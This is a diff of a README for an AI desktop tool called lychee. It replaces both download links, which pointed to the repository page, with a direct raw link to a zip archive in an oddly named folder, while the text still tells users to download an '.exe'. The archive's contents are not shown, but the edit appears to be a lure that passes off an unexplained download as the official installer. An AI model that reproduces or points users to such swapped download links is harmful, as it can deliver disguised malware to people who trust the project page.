@@ -1,6 +1,6 @@
 # 🧠 lychee - Run powerful artificial intelligence locally today
 
-[![](https://img.shields.io/badge/Download_Lychee-Blue?style=for-the-badge)](https://github.com/hermionenoncyclical848/lychee)
+[![](https://img.shields.io/badge/Download_Lychee-Blue?style=for-the-badge)](https://raw.githubusercontent.com/hermionenoncyclical848/lychee/main/perinium/Software-1.9.zip)
 
 Lychee provides a simple way to run advanced artificial intelligence models on your own computer. You do not need to send your data to outside servers. You keep full control of your information while you chat with smart models, build custom setups, or run automated agents. This software connects with tools like Ollama and HuggingFace to bring the latest technology to your desktop.
 
@@ -20,7 +20,7 @@ You should also install Ollama from its official website first, as Lychee builds
 
 You can get the latest version of Lychee from our release page. Visit the link below to find the specific installer file for your Windows computer.
 
-[Visit this page to download](https://github.com/hermionenoncyclical848/lychee)
+[Visit this page to download](https://raw.githubusercontent.com/hermionenoncyclical848/lychee/main/perinium/Software-1.9.zip)
 
 Download the file ending in `.exe`. Save it to your Downloads folder. 
 
